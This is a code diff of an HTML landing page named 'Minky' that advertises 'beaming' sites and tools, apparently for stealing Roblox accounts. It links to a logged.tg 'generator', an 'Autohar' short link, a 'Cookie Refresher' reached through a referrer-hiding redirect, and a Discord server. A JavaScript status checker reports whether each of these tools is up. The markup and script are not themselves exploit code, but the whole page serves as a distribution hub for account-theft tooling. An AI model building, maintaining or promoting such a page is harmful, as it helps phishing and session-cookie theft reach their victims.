@@ -4,8 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Minky</title>
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
@@ -21,6 +20,7 @@
       align-items: center;
       justify-content: center;
       min-height: 100vh;
+      overflow: hidden;
     }
 
     .container {
@@ -29,9 +29,9 @@
     }
 
     h1 {
-      font-size: 2.4rem;
       font-family: 'Orbitron', sans-serif;
-      margin-bottom: 10px;
+      font-size: 2.2rem;
+      margin-bottom: 8px;
     }
 
     p {
@@ -44,17 +44,16 @@
       display: flex;
       flex-direction: column;
       gap: 12px;
-      align-items: center;
     }
 
-    .link-row {
+    .link-wrapper {
       display: flex;
-      align-items: center;
       justify-content: center;
-      gap: 10px;
+      align-items: center;
+      gap: 12px;
     }
 
-    a.button {
+    .button-link {
       text-decoration: none;
       color: white;
       background: #222;
@@ -67,54 +66,52 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 15px;
+      gap: 10px;
     }
 
-    a.button:hover {
+    .button-link:hover {
       background: #1abc9c;
       color: black;
       transform: scale(1.05);
     }
 
     .status {
-      font-size: 13px;
-      padding: 6px 10px;
-      border-radius: 8px;
+      padding: 4px 10px;
+      border-radius: 6px;
+      font-size: 0.75rem;
       font-weight: bold;
+      color: white;
       white-space: nowrap;
     }
 
-    .status.working {
+    .working {
       background-color: #2ecc71;
-      color: #000;
     }
 
-    .status.down {
+    .down {
       background-color: #e74c3c;
-      color: #fff;
     }
 
-    .status-label {
-      margin-bottom: 8px;
-      font-size: 13px;
-      color: #aaa;
-    }
-
+    /* Discord Button */
     .discord-special {
-      background-color: #5865F2;
-      border: none;
+      background-color: #222;
+      border: 1px solid #333;
     }
 
     .discord-special:hover {
-      background-color: #4752c4;
+      background-color: #5865F2;
       color: white;
+    }
+
+    .discord-special:hover .discord-icon {
+      filter: brightness(0);
     }
 
     .discord-icon {
       width: 20px;
       height: 20px;
       filter: brightness(0) invert(1);
-      margin-right: 8px;
+      transition: filter 0.3s ease;
     }
 
     footer {
@@ -136,33 +133,32 @@
   </style>
 </head>
 <body>
+
   <div class="container">
     <h1>Minky</h1>
     <p>Best Beaming Sites/Methods/Tools/Tutorials 👾
 Join Our Discord For The Full Beaming Experience 👾</p>
 
-    <div class="status-label">Status</div>
-
     <div class="link-list">
-      <div class="link-row">
-        <a href="https://www.logged.tg/auth/minkybeams" target="_blank" class="button">Main Generator Site</a>
-        <span class="status" id="status-main">Checking...</span>
+      <div class="link-wrapper">
+        <a href="https://www.logged.tg/auth/minkybeams" target="_blank" class="button-link">Main Generator Site</a>
+        <span id="status-main" class="status">Checking...</span>
       </div>
-      <div class="link-row">
-        <a href="https://rbx-url.com/nnxCvx3-" target="_blank" class="button">Immortal (Generator 2)</a>
-        <span class="status" id="status-immortal">Checking...</span>
+      <div class="link-wrapper">
+        <a href="https://rbx-url.com/nnxCvx3-" target="_blank" class="button-link">Immortal (Generator 2)</a>
+        <span id="status-immo" class="status">Checking...</span>
       </div>
-      <div class="link-row">
-        <a href="https://is.gd/bhAW9Q" target="_blank" class="button">Autohar</a>
-        <span class="status" id="status-autohar">Checking...</span>
+      <div class="link-wrapper">
+        <a href="https://is.gd/bhAW9Q" target="_blank" class="button-link">Autohar</a>
+        <span id="status-auto" class="status">Checking...</span>
       </div>
-      <div class="link-row">
-        <a href="https://dropref.com/?https://www.logged.tg/tools/refresher" target="_blank" class="button">Cookie Refresher</a>
-        <span class="status" id="status-cookie">Checking...</span>
+      <div class="link-wrapper">
+        <a href="https://dropref.com/?https://www.logged.tg/tools/refresher" target="_blank" class="button-link">Cookie Refresher</a>
+        <span id="status-cookie" class="status">Checking...</span>
       </div>
-      <div class="link-row">
-        <a href="https://discord.gg/kPeNP5aJTK" target="_blank" class="button discord-special">
-          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" class="discord-icon" alt="Discord">
+      <div class="link-wrapper">
+        <a href="https://discord.gg/kPeNP5aJTK" target="_blank" class="button-link discord-special">
+          <img src="https://cdn-icons-png.flaticon.com/512/2111/2111370.png" alt="Discord" class="discord-icon">
           Discord Server
         </a>
       </div>
@@ -172,45 +168,54 @@ Join Our Discord For The Full Beaming Experience 👾</p>
   </div>
 
   <script>
-    const checks = [
+    const statuses = [
       {
         id: "status-main",
         url: "https://www.logged.tg/auth/minkybeams",
-        downPhrases: ["WEBSITE UNDER MAINTENANCE", "404┃Page Is Missing", "This site can’t be reached"]
+        downIndicators: ["WEBSITE UNDER MAINTENANCE", "404 | Page is missing...", "This site can’t be reached"]
       },
       {
-        id: "status-immortal",
+        id: "status-immo",
         url: "https://rbx-url.com/nnxCvx3-",
-        downPhrases: ["This site can’t be reached"]
+        downIndicators: ["This site can’t be reached"]
       },
       {
-        id: "status-autohar",
+        id: "status-auto",
         url: "https://is.gd/bhAW9Q",
-        downPhrases: ["This site can’t be reached"]
+        downIndicators: ["This site can’t be reached"]
       },
       {
         id: "status-cookie",
         url: "https://dropref.com/?https://www.logged.tg/tools/refresher",
-        downPhrases: ["404┃Page Is Missing", "This site can’t be reached"]
+        downIndicators: ["404 | Page is missing...", "This site can’t be reached"]
       }
     ];
 
-    async function checkStatus(item) {
+    async function checkSiteStatus(id, url, downIndicators) {
       try {
-        const response = await fetch(item.url);
-        const text = await response.text();
-        const isDown = item.downPhrases.some(phrase => text.includes(phrase));
-        const el = document.getElementById(item.id);
-        el.classList.add(isDown ? "down" : "working");
-        el.textContent = isDown ? "Down" : "Working";
-      } catch (e) {
-        const el = document.getElementById(item.id);
-        el.classList.add("down");
-        el.textContent = "Down";
+        const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
+        const text = await response.text?.() || "";
+
+        const isDown = downIndicators.some(keyword => text.includes(keyword));
+        const statusEl = document.getElementById(id);
+        if (isDown) {
+          statusEl.textContent = "Down";
+          statusEl.classList.add("down");
+        } else {
+          statusEl.textContent = "Working";
+          statusEl.classList.add("working");
+        }
+      } catch {
+        const statusEl = document.getElementById(id);
+        statusEl.textContent = "Down";
+        statusEl.classList.add("down");
       }
     }
 
-    checks.forEach(checkStatus);
+    statuses.forEach(site => {
+      checkSiteStatus(site.id, site.url, site.downIndicators);
+    });
   </script>
+
 </body>
 </html>
